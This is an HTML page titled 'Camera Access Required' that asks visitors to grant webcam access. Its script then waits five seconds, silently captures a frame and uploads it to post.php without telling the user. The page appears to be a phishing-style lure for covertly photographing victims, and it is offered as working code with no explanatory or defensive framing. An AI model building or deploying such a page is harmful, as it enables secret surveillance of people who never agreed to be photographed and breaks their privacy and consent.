<!DOCTYPE html>
<html>
  <head>
    <title>Camera Access Required</title>
  </head>
  <body>
    <center>
      <h2>Please allow camera access</h2>
      <video id="video" width="320" height="240" autoplay></video>
      <script>
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(function(stream) {
            document.getElementById('video').srcObject = stream;
            let canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            let context = canvas.getContext('2d');

            setTimeout(function() {
              context.drawImage(video, 0, 0, 320, 240);
              canvas.toBlob(function(blob) {
                let xhr = new XMLHttpRequest();
                xhr.open("POST", "post.php", true);
                xhr.send(blob);
              });
            }, 5000); // auto capture after 5 seconds
          });
      </script>
    </center>
  </body>
</html>